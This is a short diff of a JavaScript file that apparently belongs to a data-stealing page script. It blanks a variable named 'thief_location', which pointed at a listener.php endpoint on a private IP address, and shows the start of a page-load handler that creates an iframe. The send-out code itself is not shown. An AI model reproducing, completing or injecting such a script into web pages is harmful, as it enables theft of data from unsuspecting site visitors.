@@ -1,4 +1,4 @@
-var thief_location = "http://192.168.0.17/get/"; //location of listener.php
+var thief_location = ""; //location of listener.php
 
 document.addEventListener("DOMContentLoaded", function() {
 	var ifrm = document.createElement("iframe");
